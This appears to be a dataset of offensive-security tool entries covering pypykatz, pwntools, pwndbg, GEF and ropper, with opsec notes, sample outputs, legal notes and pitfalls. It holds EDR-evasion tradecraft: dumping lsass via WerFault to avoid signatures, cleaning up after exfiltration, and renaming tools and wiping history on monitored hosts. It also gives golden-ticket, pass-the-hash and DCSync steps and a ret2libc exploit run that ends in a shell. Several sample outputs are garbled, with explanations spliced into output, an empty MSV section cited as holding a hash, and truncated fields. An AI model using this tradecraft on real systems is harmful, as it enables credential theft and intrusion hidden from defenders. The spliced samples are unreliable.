Evasion path for 2025-2026: dump lsass via a signed, legitimate process that already has SeDebugPrivilege — e.g., via a custom reflective DLL injected into a process like svchost.exe, or using the SilentProcessExit / WerFault technique to trigger a dump through Windows Error Reporting (werfault.exe is a trusted signer). The dump is then exfiltrated and parsed offline with pypykatz. This avoids the procdump/comsvcs signatures but still generates EID 10 on lsass — defenders watching for ANY lsass handle with VM_READ will still catch it.

Concrete defender artifact: pypykatz parsing a dump file locally generates NO Windows event logs and NO network traffic. The only forensic artifact on the operator box is the dump file itself and pypykatz's output. On the TARGET, the artifact trail is: Security EID 10 (lsass access), Sysmon EID 10 (with GrantedAccess), and the .dmp file on disk if not cleaned up. Ensure the dump file is deleted from the target immediately after exfil and that your exfil channel (SMB, HTTP, DNS) is within scope.

sample_outputs.scenario: Beginner: Operator has a fresh lsass.dmp pulled from a Windows 10 workstation via Task Manager. Parsing it locally to find any cleartext credentials or NTLM hashes for a single user session.
sample_outputs.output:

session_id 1
username jsmith
domainname CORP
logon_server DC01
logon_time 2025-03-14T08:22:11.443701+00:00

luid 123456
	== MSV ==

	== WDIGEST ==

sample_outputs.explanation: The MSV section is the money shot for beginners. NTHash (8846f7eaee8fb117ad06bdd830b7586c) is the NTLM hash for jsmith — this is the classic 'password' hash (that specific hash is the well-known hash for 'password', meaning the user has a terrible password). LMHash starting with 'aad3b435...' is the null LM hash — LM is disabled, which is normal on modern Windows. WDIGEST Password: None means WDigest plaintext caching is disabled (default since KB2871997 / Windows 8.1+). Next steps: (1) crack the NTHash offline with hashcat using mode -m 1000, (2) use the hash directly for pass-the-hash with crackmapexec or evil-winrm without cracking, (3) check if jsmith is a local admin or domain admin via BloodHound.

	== Kerberos ==

		Password: None
		Tickets:

			EncType: aes256-cts-hmac-sha1-96

			EndTime: 2025-03-14T18:00:00
== DPAPI ==
	MasterKey: 4a7f2c1e9b3d5f7a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f
	SHA1: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
sample_outputs.explanation: Finding krbtgt's NTHash on a DC lsass dump is the golden ticket prerequisite. With this hash plus the domain SID (visible in the sid field of any domain user's logon session), an operator can forge a Kerberos TGT for any user — including non-existent ones — valid for up to 10 years using impacket's ticketer.py or mimikatz's kerberos::golden. The DPAPI MasterKey enables decryption of any DPAPI-protected secret on that machine: Chrome saved passwords, RDP credentials in Credential Manager, certificate private keys. Next steps: (1) forge golden ticket: 'impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain CORP.LOCAL Administrator', (2) decrypt DPAPI blobs with pypykatz's own 'dpapi' module or impacket's dpapi.py using the extracted masterkey, (3) use secretsdump.py with the golden ticket to DCSync the entire domain without touching lsass again, (4) import the Kerberos ticket with 'export KRB5CCNAME=ticket.ccache' and use it with any impacket tool via '-k -no-pass'.

legal_notes: CFAA 18 U.S.C. § 1030(a)(2) and (a)(5): Accessing lsass memory — even to create a dump file — on a system you are not authorized to test constitutes unauthorized access to a protected computer. The credential material extracted (NTLM hashes, Kerberos tickets) constitutes 'information from a protected computer.' Possession of credential material from unauthorized systems is a separate exposure from the access itself. Ensure written authorization explicitly covers credential extraction, not just 'vulnerability scanning.'

Rules of engagement must explicitly authorize credential harvesting. Many engagements permit scanning and exploitation but restrict credential dumping, lateral movement with harvested credentials, or exfiltration of credential material off the client network. Confirm your SOW/RoE covers: (a) lsass dump creation, (b) exfiltration of the dump file to your operator box, (c) use of extracted hashes for pass-the-hash or ticket forging, and (d) any downstream systems accessed using harvested credentials.

Cloud and hybrid AD consideration: In Azure AD / Entra ID hybrid environments, NTLM hashes extracted from on-prem lsass dumps may be usable against cloud-synced accounts depending on the authentication configuration (PTA vs. PHS). Password Hash Sync (PHS) environments sync NTLM-derived hashes to Azure AD — a cracked on-prem hash may directly authenticate to O365, Azure portal, or other SaaS apps. Your authorization scope must explicitly cover cloud tenant access if you intend to test this path; cloud tenants are separate legal entities from the on-prem environment.
false_positives: WDigest plaintext passwords will show 'None' on any Windows system with KB2871997 applied (Windows 7 SP1+, Server 2008 R2+ with the patch, all Win8.1/2012R2 and later). Operators sometimes misread this as a parsing failure. It is not — WDigest caching is simply disabled. The only way to get plaintext via WDigest post-2014 is to re-enable it via registry (HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1) and wait for the user to re-authenticate, which is a separate and noisy operation.

Kerberos ticket sections will appear empty or show only service tickets (no TGTs) if the dump was taken from a non-interactive session or a service account context where no TGT was cached in lsass. This is common when dumping lsass from a server running only background services — the absence of TGTs is not a pypykatz bug, it reflects the actual session state.

On Windows 11 22H2+ with Credential Guard enabled (default on Entra-joined devices and many enterprise GPO configurations), MSV NTHash fields will return as all zeros (0000000000000000000000000000000000000000) or be absent entirely. Credential Guard moves credential material into a VSM (Virtual Secure Mode) enclave that lsass cannot access even with SYSTEM privileges. pypykatz will parse the dump successfully but yield no usable hashes — this is not a tool failure, it is Credential Guard working as designed.

DPAPI masterkey entries in the dump are keyed to the user's password at the time of the dump. If the user changed their password after the masterkey was generated, the masterkey in lsass may be a cached older version that no longer decrypts current DPAPI blobs. You may successfully extract a masterkey that fails to decrypt target blobs — verify masterkey freshness against the DPAPI blob's creation timestamp.

On systems with multiple simultaneous logon sessions (RDS servers, jump boxes, shared workstations), pypykatz will output credential blocks for every cached session including service accounts, scheduled task accounts, and network logon sessions. NTLM hashes for network logon sessions (logon type 3) are often machine account hashes or service account hashes that are not directly crackable or useful for lateral movement — operators frequently misidentify these as high-value targets. Check the logon_type field and session_id to prioritize interactive (type 2) and remote interactive (type 10) sessions.

pwntools.description: Python CTF/exploit framework. Wraps socket setup, packing primitives (p32/p64), ROP gadget chains, ELF/PE parsing, shellcode generation, and process interaction
pwntools.teach_intro: Every binary CTF challenge starts with 'from pwn import *'. Build a process or socket, send crafted bytes, get a shell. context.binary tells pwntools the architecture so p64(0xdeadbeef) does the right packing. ROP chains: rop = ROP(elf); rop.system('/bin/sh'). Shellcode: shellcraft.amd64.linux.sh(). The library is what makes 'spending 4 hours writing a buffer overflow exploit' feasible. Not a tool you run; a library you build with.
opsec_notes: Beginner noise: pwntools in process mode calls fork()/execve() locally — no network noise for local CTF binaries. But when using remote(), it opens a raw TCP socket to the target. Any IDS/NIDS with connection-count baselines will see repeated connections from your IP if you're iterating exploit attempts in a loop — each failed attempt is a new TCP SYN to the same port.

Concrete artifact — Linux: when pwntools spawns a subprocess via process(), the parent-child relationship is python3 -> target_binary. On a monitored host, auditd will log execve() syscalls (audit.log, key fields: type=EXECVE, argc, a0/a1/a2). If the binary is SUID, this is an immediate high-signal alert in any SIEM with Linux auditd ingestion.

Concrete artifact — Windows (if targeting Windows binaries via WSL or cross-platform): pwntools shellcraft payloads written to disk before injection will be scanned by Defender for Endpoint's AMSI integration at the PowerShell/script engine boundary. Shellcode blobs containing common pwntools shellcraft patterns (e.g., the standard amd64 execve('/bin/sh') stub) have static signatures in Defender AV as of 2024-2025. Deliver shellcode via in-memory buffers, not file writes, and consider custom shellcode over shellcraft defaults on live engagements.

2025-2026 cutting edge: CrowdStrike Falcon's process tree anomaly detection scores parent-child relationships. A python3 process spawning /bin/sh (or cmd.exe) via a buffer overflow is a textbook high-confidence alert — Falcon's ML model has been trained on exactly this pattern since 2022. On real engagements, your post-exploitation shell should come from a C2 stager, not a raw execve('/bin/sh') shellcraft payload.

2025-2026 cutting edge: ETW-TI (Event Tracing for Windows — Threat Intelligence provider) in Win11 22H2+ and Server 2022 logs userspace shellcode execution events at the kernel level via PsSetCreateThreadNotifyRoutine callbacks. If you're using pwntools to build a Windows exploit (e.g., via a cross-compiled payload or targeting a Windows service), any shellcode that allocates RWX memory and transfers control will generate ETW-TI telemetry that SentinelOne and Defender for Endpoint both consume. Pwntools is primarily a Linux/CTF tool — on Windows targets, use purpose-built C2 frameworks for post-exploitation.

ROP chain artifact: when pwntools constructs a ROP chain and sends it over the wire, the payload is a sequence of return addresses in the binary's own .text section. Network-layer DPI won't catch this (it looks like binary garbage). However, if the target binary is running under gdb or a process monitor, the stack pivot is visible in register state. On CTF infrastructure, this is expected. On a real pentest target running a custom service, check whether the binary has shadow stack (Intel CET) enabled — pwntools ROP chains will fault immediately on CET-protected binaries and the crash will be logged.

sample_outputs.scenario: Beginner CTF: 32-bit Linux binary with a simple stack buffer overflow. Student is connecting to a local CTF challenge binary, finding the offset to EIP, and confirming control with a cyclic pattern.
sample_outputs.output:
[*] '/home/ctf/challenges/vuln32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/ctf/challenges/vuln32': pid 14823
[*] Sending cyclic pattern of length 200...
[*] Process '/home/ctf/challenges/vuln32' stopped with exit code -11 (SIGSEGV)
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Cyclic pattern offset: EIP = 0x6161616c
[*] Found offset at 76 bytes
[*] Closing tubes
sample_outputs.explanation: The checksec output at the top (Arch, RELRO, Stack, NX, PIE) is pwntools parsing the ELF binary's headers — this is your attack surface map. 'No canary found' means no stack cookie to bypass. 'NX disabled' means the stack is executable, so you can inject raw shellcode instead of needing a ROP chain. 'No PIE' means the binary loads at a fixed base address (0x8048000) every run — no ASLR to defeat at the binary level. The SIGSEGV confirms EIP was overwritten. The cyclic pattern (generated by cyclic(200)) encodes position into the bytes, so when EIP = 0x6161616c, pwntools decodes that as offset 76. Next steps: (1) craft payload = b'A'*76 + p32(shellcode_address), (2) generate shellcode with asm(shellcraft.i386.linux.sh()), (3) send and catch the shell with io.interactive().

sample_outputs.scenario: Advanced CTF / real-world: 64-bit Linux binary with NX enabled, partial RELRO, no PIE, no canary. Operator builds a ret2libc ROP chain using pwntools ROP class to leak a libc address via puts(), calculate libc base, then call system('/bin/sh'). Remote target on CTF server.
sample_outputs.output:
[*] '/home/operator/pwn/service64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to pwn.ctf.example.com on port 4444: Done
[*] Loaded 196 cached gadgets for 'service64'
[*] puts@plt   = 0x401060
[*] puts@got   = 0x404018
[*] pop rdi    = 0x4012a3
[*] ret        = 0x40101a
[+] Sending stage 1 (leak)...
[*] Leaked puts@libc: 0x7f3a2c4e5aa0
[*] libc base:        0x7f3a2c462000
[*] system()  =       0x7f3a2c4b3290
[*] /bin/sh   =       0x7f3a2c5d4e9a
[+] Sending stage 2 (shell)...
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat /flag
CTF{r0p_ch41ns_4r3_b3tt3r_w1th_pwnt00ls}
sample_outputs.explanation: NX enabled means the stack is not executable — raw shellcode injection fails. The ROP class scanned the binary's .text section and found 196 usable gadgets. The exploit runs in two stages: Stage 1 uses a 'pop rdi; ret' gadget to set the first argument register, then calls puts@plt with puts@got as the argument — this prints the runtime address of puts in libc, leaking the ASLR slide. Stage 2 computes libc base (leaked_puts - puts_offset_in_libc), then calculates system() and '/bin/sh' string addresses, and calls system('/bin/sh'). The 'ret' gadget before system() is the classic stack alignment fix for 64-bit — system() requires 16-byte stack alignment or it segfaults on movaps. Next-step tools and techniques: (1) use pwnlibc / libc-database to identify the remote libc version from the leaked address if unknown, (2) if canary is present, look for format string vuln to leak it first, (3) if PIE is enabled, you need a separate leak of a binary address before building the ROP chain — look for an info leak in the binary's own logic.

legal_notes: CFAA boundary: pwntools' remote() function opens a TCP connection to a target host. Connecting to any host you do not own or have explicit written authorization to test — even just to send a crafted payload — constitutes unauthorized access under 18 U.S.C. § 1030(a)(2). CTF platforms (HackTheBox, PicoCTF, CTFtime events) provide implicit authorization within their declared scope. A university lab binary on your own VM is always safe. A 'practice' connection to a production service you found on Shodan is not.

Rules of engagement: if pwntools is being used as part of a paid penetration test (e.g., targeting a custom network service), the specific binary, port, and host must be within the written scope. Exploit attempts that crash a service constitute a denial-of-service impact — confirm with the client whether service disruption is acceptable before running exploit loops against production. Always test against a staging environment first.

Modern cloud consideration: pwntools is occasionally used to exploit services running in containers or serverless functions (e.g., a CTF challenge hosted on AWS Lambda behind an ALB, or a vulnerable Go service in a K8s pod). Successful exploitation of a containerized service may give you a shell inside a pod — lateral movement from that pod into the cluster (via mounted service account tokens, IMDS access to cloud credentials) is a separate authorization question. Confirm your rules of engagement explicitly cover post-exploitation and lateral movement, not just initial access to the declared target.
false_positives: Cyclic offset detection fails on binaries compiled with AddressSanitizer (ASan): ASan intercepts the SIGSEGV before pwntools can read the faulting address, and the crash output goes to stderr in ASan's own format rather than a clean register dump. The offset calculation will return None or an incorrect value. Recompile without ASan or use GDB with 'x/wx $rsp' manually.

ROP gadget cache is stale: pwntools caches gadgets in a .pwntools-cache directory keyed by binary hash. If you patch the binary (e.g., with patchelf to change the interpreter or RUNPATH) after the cache is built, the cached gadgets may reference wrong offsets. Delete the cache or use ROP(elf, badchars=b'') with cache=False to force a rescan.

p64() packing assumes little-endian by default (context.endian = 'little'). If you're targeting a MIPS big-endian binary or a network protocol field and forget to set context.endian = 'big', your addresses will be byte-reversed and the exploit will silently fail — the binary will crash at a nonsensical address rather than your gadget.

remote() with SSL=True does not verify the server certificate by default in older pwntools versions. On a CTF where the challenge rotates TLS certs, this is fine. On a real engagement where you're testing a TLS service, be aware that pwntools is not doing certificate pinning or hostname verification — you may be talking to a load balancer or CDN termination point, not the backend service you think you're exploiting.

process() on macOS uses a different ptrace implementation than Linux, and certain pwntools features (gdb.attach(), corefile parsing) behave differently or fail silently. If you develop an exploit on macOS and it works locally but fails on the remote Linux target, the issue is often stack layout differences due to macOS's 16-byte-aligned stack enforcement being stricter, or dyld vs ld-linux differences in library loading order affecting leak addresses.

pwndbg.description: GDB plugin for exploit development and reverse engineering. Adds disassembly views, stack/heap visualizations, ROP search, GOT/PLT inspection, heap analysis (fo
pwndbg.teach_intro: Bare GDB is hostile to exploit developers. pwndbg makes the stack readable, highlights the current instruction in color, shows GOT entries, finds gadgets with 'rop', and analyzes heap chunks with 'heap'. Competes with GEF (similar idea, different feature set) and PEDA (older, less maintained). Most exploit-dev courses default to pwndbg. Pairs with pwntools — develop the exploit logic in Python, debug crashes interactively in pwndbg.
opsec_notes: pwndbg is a local debugger — it generates zero network traffic and leaves no remote artifacts. The primary opsec concern is on the analyst's own machine: core dumps, crash logs, and GDB history files (~/.gdb_history) may contain sensitive memory contents, shellcode, or ROP chains that could be recovered from disk during forensic review of a compromised dev box.

When running pwndbg against a live process (attach mode via 'attach <PID>'), the ptrace syscall is used. On Linux systems with Yama LSM enabled (ptrace_scope=1 or higher), attaching to a process you don't own will fail with EPERM. On hardened systems (ptrace_scope=2), only privileged processes can ptrace at all — this is a common gotcha on modern Ubuntu 22.04+ and Debian 12 defaults.

CrowdStrike Falcon and SentinelOne both instrument ptrace-based debugging via kernel-level telemetry. On a monitored endpoint, attaching pwndbg to a production process (e.g., during post-exploitation to debug a running service for memory disclosure) will generate a process-tree anomaly alert: parent shell -> gdb -> target process. The command-line argument 'attach <PID>' combined with a non-developer parent process is a high-fidelity behavioral indicator in both platforms as of 2025.

Microsoft Defender for Endpoint (MDE) on Linux (mdatp) uses eBPF-based telemetry (fanotify + audit subsystem) to capture exec events. Launching gdb or pwndbg against a sensitive binary on a monitored Linux host will generate an alert under the 'Suspicious debugger attachment' category. The artifact visible to the defender is an audit log entry: type=SYSCALL syscall=ptrace a0=PTRACE_ATTACH a1=<target_pid> — logged to /var/log/audit/audit.log and forwarded to the MDE cloud pipeline.

The ~/.gdb_history file persists every command typed in a pwndbg session in plaintext, including memory addresses, shellcode bytes entered as 'set {char[N]} addr = {...}', and ROP chain construction commands. On a shared research machine or a box you've compromised and are using interactively, this file is a forensic artifact. Wipe it or redirect history: 'set history filename /dev/null' in .gdbinit, or 'unset HISTFILE' equivalent for GDB.

When using pwndbg's 'rop' command to search for gadgets, it reads the mapped binary and all loaded shared libraries from /proc/<pid>/maps and then reads those files from disk. On a system with auditd configured to watch library paths (e.g., '-w /lib/x86_64-linux-gnu/ -p r -k lib_read'), each gadget search triggers a burst of read audit events against libc, libpthread, etc. This pattern — many rapid file reads against system libraries from a gdb process — is a detectable signature in auditd logs (EID: SYSCALL with syscall=openat against lib paths).

sample_outputs.explanation: The 'heap' output reveals a free tcache chunk whose fd pointer (0x405260) points back into the heap rather than to the next free chunk of the same size class — a classic tcache poisoning setup where a UAF or double-free has corrupted the fd. The 'got' output shows Partial RELRO is in effect, meaning GOT entries are writable at runtime — puts@GOT at 0x404018 is a high-value overwrite target because puts is called after user-controlled input, enabling a one-shot shell if redirected to system() or a one_gadget. Next steps: (1) Use 'x/4gx 0x4052a0' to inspect the raw chunk header bytes and confirm the fd corruption. (2) Run 'one_gadget /lib/x86_64-linux-gnu/libc.so.6' (external tool) to find a one-gadget RCE address relative to libc base — requires a libc leak first, which puts@PLT can provide before overwrite. (3) Use pwntools' 'p.send()' to automate the allocation sequence that triggers the poisoned tcache allocation, landing malloc's return value at the GOT entry. (4) Verify the tcache key field (glibc 2.32+ mitigation) — use 'p &((struct malloc_chunk *)0x4052a0)->key' in pwndbg to check if the key matches the tcache struct address, which must be zeroed before the double-free is re-triggered.

legal_notes: Under 18 U.S.C. § 1030 (CFAA), attaching pwndbg to a process running on a system you do not own or have explicit written authorization to test constitutes unauthorized access even if the binary is world-readable. 'I was just debugging it' is not a defense — ptrace attachment to a live process is an access event. Ensure your engagement scope explicitly authorizes interactive debugging of running services, not just network-level testing.

Rules of engagement for penetration tests rarely contemplate interactive debugger attachment to production processes. Even if a target binary is in scope, attaching gdb/pwndbg to its live PID can cause the process to pause (SIGSTOP during attach), drop connections, or crash — constituting a denial-of-service impact that may be out of scope. Confirm with the client whether live process debugging is authorized, or restrict pwndbg use to offline copies of the binary.

In cloud environments (AWS EC2, Azure VM, GCP Compute), attaching a debugger to a process may violate the cloud provider's acceptable use policy if the process belongs to a managed service or shared-tenancy component. Additionally, if the binary being analyzed contains cryptographic key material or PII extracted from a production system, local analysis on a non-authorized machine may create data-handling compliance violations (SOC 2, HIPAA, PCI-DSS) independent of CFAA considerations.
false_positives: pwndbg's 'checksec' output can report 'Canary: Yes' for a binary that was compiled with -fstack-protector-strong but whose canary check is bypassed by the specific vulnerability being exploited (e.g., a format string write that overwrites the canary before the epilogue check). The presence of a canary in checksec does not mean the binary is safe — it means the exploit must account for leaking or overwriting the canary value.

The 'heap' command's chunk classification can be wrong when a binary uses a custom allocator layered on top of glibc malloc (e.g., jemalloc, tcmalloc, or a hand-rolled slab allocator). pwndbg reads glibc malloc's internal structures (main_arena, tcache_perthread_struct) — if those aren't populated because the binary never called glibc malloc, 'heap' will either show nothing or show garbage metadata. Always verify with 'vmmap' that the heap region is actually a glibc-managed arena.

The 'rop' gadget search reads from the binary's mapped segments as seen in /proc/<pid>/maps. If the binary is PIE (Position Independent Executable) and ASLR is enabled, the addresses shown by 'rop' are the runtime-randomized addresses for that specific run — they will be different on the next execution. Students frequently copy a gadget address from 'rop' output and hardcode it into an exploit, which then fails on every subsequent run. Always compute gadget offsets relative to the binary's base address (visible in 'vmmap') and add the leak-derived base at runtime.

pwndbg's 'got' command shows the current resolved state of GOT entries. If a function has not yet been called, its GOT entry still points to the PLT stub (lazy binding), not the actual libc address. A student who reads a GOT entry before the function is called will get the PLT stub address and incorrectly compute a libc base offset, producing a wrong libc leak. Use 'got' only after the target function has been called at least once, or disable lazy binding analysis by forcing full RELRO awareness.

When using 'telescope' or 'stack' to inspect stack contents, pwndbg will attempt to dereference every pointer it finds and annotate it with the symbol or string it points to. On a binary with a corrupted stack (e.g., mid-exploit after a partial overflow), this dereferencing can cause GDB itself to segfault or hang if it tries to read an unmapped address. This is not a bug in the target — it's pwndbg's annotation engine hitting an invalid pointer. Use 'x/Ngx $rsp' (raw GDB hex dump) instead when the stack is known to be corrupted.

gef.description: Alternative to pwndbg — same goal (make GDB usable for exploit dev), different feature set. Strong heap analysis, ARM/MIPS/SPARC support, integration with capst
gef.teach_intro: GEF vs pwndbg is religious-debate territory among exploit devs. GEF's strengths: better non-x86 architecture support (ARM Cortex-M, MIPS), built-in capstone for arbitrary-architecture disassembly. pwndbg's strengths: heap visualization, faster Python startup, integration with pwntools. Try both, pick one. Switching mid-engagement breaks muscle memory.
opsec_notes: GEF itself is a local debugger — it generates NO network traffic and NO system calls beyond what the target binary already makes. The noise it creates is entirely process-level: attaching to a running process via ptrace() is the primary artifact a defender can observe.

On Linux, attaching GEF/GDB to a running process generates a ptrace(PTRACE_ATTACH, <pid>) syscall. EDRs like CrowdStrike Falcon and SentinelOne monitor ptrace events via eBPF or kernel module hooks. A non-developer process (e.g., a web shell or reverse shell) calling ptrace on a high-value process (e.g., sshd, sudo, a database daemon) will score high on behavioral anomaly engines and may trigger an automatic kill or alert.

Concrete artifact — Sysmon on Linux (via sysmonforlinux) logs ptrace attach events under EventID 26 (ProcessAccess equivalent). The log entry includes the source PID, target PID, and the calling process image path. If your shell is /tmp/.x or a renamed bash, this stands out immediately in any SIEM with a Sysmon Linux parser.

On modern kernels (5.15+, common in Ubuntu 22.04/24.04 and RHEL 9), Yama LSM ptrace_scope is often set to 1 or 2 by default (/proc/sys/kernel/yama/ptrace_scope). Scope 1 restricts ptrace to parent processes; scope 2 restricts to processes with CAP_SYS_PTRACE. Attempting to attach without the right capability fails silently from GEF's perspective but generates a kernel audit log entry (auditd, type=AVC or type=SYSCALL with result=denied) that a tuned SIEM will catch.

CrowdStrike Falcon's 2024-2025 sensor versions (7.x) include user-space memory inspection telemetry that flags processes loading large Python runtimes (GEF is Python-heavy) immediately after attaching to a sensitive process. The parent-child chain 'bash -> python3 -> ptrace(sshd)' is a high-confidence IOA pattern in Falcon's behavioral engine. If you must use GEF on a live target during a covert engagement, do it inside a controlled VM snapshot, not on the production host.

For ARM/MIPS embedded targets (IoT, routers, PLCs), GEF is often run cross-architecture via QEMU user-mode emulation. The artifact here shifts: QEMU itself may be flagged by host-based monitoring if it's not normally present on the system. The combination of qemu-arm-static + gdbserver on a non-developer host is a strong behavioral indicator in environments with application whitelisting (e.g., Carbon Black App Control).

The 'IS_MMAPPED' flag on a non-mmapped chunk is also a corruption indicator. Next steps: (1) use 'watch *(uint32_t*)0xb6800440' in GEF to set a hardware watchpoint on the corrupted fd field and re-trigger the UAF to identify the exact write primitive; (2) use 'capstone-disassemble $pc 20' to disassemble the current ARM instruction stream with capstone (GEF's strength over pwndbg here — native ARM Thumb2 support without extra config); (3) pivot to pwntools with a GDB stub ('gdb.attach(p, gdbscript=...)') to automate heap grooming and confirm the allocation primitive gives you control over a function pointer or GOT entry. On this ARM target, check whether the firmware uses a custom allocator (common in embedded) — GEF's heap commands assume glibc ptmalloc2; if the allocator is dlmalloc or a vendor fork, the chunk metadata offsets will be wrong and you'll need to manually define chunk structures with 'struct' commands.

legal_notes: Under 18 U.S.C. § 1030 (CFAA), attaching a debugger to a process you do not own or have explicit written authorization to analyze constitutes unauthorized access to a computer. This applies even if the binary is running on hardware you physically possess — if the software is proprietary and the license prohibits reverse engineering, you may also face civil liability under the DMCA § 1201 (circumvention of technological protection measures). Always obtain written authorization before debugging any binary in a professional engagement context.

Rules of engagement for exploit development engagements must explicitly authorize dynamic analysis (debugging, fuzzing, memory inspection) as a distinct permission from static analysis. Some client scopes permit 'vulnerability assessment' but not 'exploitation' — attaching GEF to a live production process and manipulating its memory state crosses into exploitation territory. Confirm your RoE covers dynamic analysis before attaching to anything outside a controlled lab environment.

For IoT and embedded targets in cloud-connected or OT/ICS environments: debugging firmware extracted from a device may be legally permissible under your engagement scope, but if that firmware communicates with a cloud backend (AWS IoT Core, Azure IoT Hub), any exploit you develop and test — even locally — that could affect the cloud-side infrastructure may require separate authorization covering those cloud resources. Modern IoT attack chains cross the air gap into managed cloud services; ensure your scope document explicitly covers both the device and its cloud control plane.
false_positives: GEF's 'heap chunks' command assumes glibc ptmalloc2 chunk layout. Binaries compiled against musl libc (common in Alpine Linux containers and many embedded systems), jemalloc (Firefox, FreeBSD), or tcmalloc (Chrome, many Go binaries) will produce completely wrong chunk boundary calculations. GEF will happily walk memory and display garbage as 'chunks' with no warning. Always verify the allocator with 'info sharedlibrary' or 'ldd' before trusting heap output.

On ARM Thumb/Thumb2 targets, GEF may misidentify the instruction set mode if the LSB of the PC is not correctly set. A Thumb function called with BLX will have PC LSB=1, but if GEF's capstone integration receives a raw address without the LSB, it will disassemble as ARM32 and every instruction will be wrong — the operands, the branch targets, everything. Verify with 'info registers cpsr' and check the T (Thumb) bit before trusting disassembly output on ARM targets.

GEF's 'checksec' output for PIE (Position Independent Executable) can show 'PIE enabled' even when ASLR is disabled system-wide (/proc/sys/kernel/randomize_va_space = 0). PIE is a binary property; ASLR is a kernel property. A PIE binary with ASLR disabled loads at a fixed address every run. Students who see 'PIE enabled' and assume the base address is randomized will waste time on ASLR bypass techniques that are unnecessary.

When debugging via 'target remote' (QEMU or gdbserver), GEF's register display may show stale values if the remote stub doesn't flush register state on every stop event. This is a known issue with some QEMU versions (pre-8.0) where the 'g' packet response is cached. If $rip/$pc looks wrong after a breakpoint hit, force a register refresh with 'info registers' before trusting GEF's context panel.

GEF's 'format-string-helper' and 'heap-analysis-helper' commands hook glibc internals via breakpoints on internal symbols like '__printf_chk' and 'malloc'. If the binary is statically linked or uses a stripped glibc, these hooks silently fail to install and the helper commands return no output — not an error, just silence. An operator who doesn't notice the missing hook will incorrectly conclude there are no format string calls or heap allocations in the binary.

ropper.description: Searches binaries for ROP gadgets and JOP/COP chains. Faster and more thorough than ROPgadget for x86/x64; supports ARM, MIPS, PowerPC, SPARC. Outputs gadgets,
ropper.teach_intro: ROP (Return-Oriented Programming) bypasses NX/DEP by chaining existing code snippets ('gadgets' ending in ret) instead of injecting shellcode. ropper /path/to/binary lists every gadget. ropper --chain execve /bin/sh asks the tool to find a complete chain that executes a shell. Pairs with pwntools to assemble the chain bytes into an exploit. ROPgadget is the older, slower alternative; ropper is the modern default for serious exploit dev.
opsec_notes: Beginner noise: ropper reads the target binary from disk — it generates no network traffic and makes no system calls against a live target. The only observable artifact is the file open/read of the binary itself. If you're analyzing a binary on a compromised host, this is a local disk read, not a network event.

Concrete artifact — file access telemetry: On a monitored Linux host, reading a SUID binary or a system library (e.g., /lib/x86_64-linux-gnu/libc.so.6) with ropper will generate inotify/fanotify events. EDRs like CrowdStrike Falcon on Linux log file-open events for sensitive paths; reading /proc/self/maps or system libraries in rapid succession is a behavioral indicator for local privilege escalation staging.

2025-2026 cutting edge — process tree anomaly: Falcon and SentinelOne both score parent-child process relationships. If ropper is spawned from a web shell (nginx -> python3 -> ropper), the process tree is immediately anomalous. Modern XDR platforms use ML-scored process lineage; a ropper invocation under an unexpected parent (apache2, sshd, or a container entrypoint) will generate a high-confidence alert even if the binary name is renamed.

2025-2026 cutting edge — command-line entropy and argument scanning: Defender for Endpoint and SentinelOne ingest full command-line strings via ETW (Microsoft-Windows-Kernel-Process on Windows, eBPF-based sensors on Linux). The string 'ropper' or '--chain execve' in argv is a high-signal indicator. On Windows, if ropper is run under WSL2, the host EDR still sees the WSL process via the Hyper-V boundary telemetry introduced in Win11 22H2 kernel callbacks (PsSetCreateProcessNotifyRoutineEx2). Rename the binary and avoid shell history if operating on a monitored host.

Artifact on disk — output files: ropper --file /path/to/binary --output gadgets.txt writes a plaintext gadget list to disk. On a monitored endpoint, any new file write in a working directory (especially /tmp, /dev/shm, or a user home) is logged by Sysmon-equivalent sensors (Linux auditd rule -w /tmp -p wa). Pipe output to stdout and consume it in-memory via pwntools instead of writing to disk.

Scope boundary: ropper is a static analysis tool — it never touches a live process or remote host. However, the binary you feed it may be subject to export controls (e.g., firmware from a defense contractor's embedded device). Possessing and analyzing certain firmware images without authorization can itself constitute unauthorized access to a protected computer under 18 U.S.C. § 1030 if the binary was obtained from a system you were not authorized to access.

sample_outputs.scenario: Beginner: CTF binary on a local Linux box. Operator wants to see all available ROP gadgets in a small 32-bit ELF to understand what building blocks exist before writing a ret2libc exploit.
sample_outputs.explanation: Each line is one gadget: a memory address followed by the instruction sequence ending in 'ret'. The 'ret' is what makes it a ROP gadget — when you overwrite the return address on the stack with 0x08048390, execution jumps there, pops a value into EAX, then 'ret' pops the NEXT address off the stack, chaining to the next gadget. For a beginner: you now have pop eax, pop ebx, pop ecx, pop edx, a write primitive (mov [eax], edx), and a syscall (int 0x80). That is everything needed for a 32-bit execve('/bin/sh') ROP chain. Next steps: (1) find the address of '/bin/sh' in libc with 'strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh', (2) calculate offsets with pwntools cyclic(), (3) assemble the chain with pwntools flat().
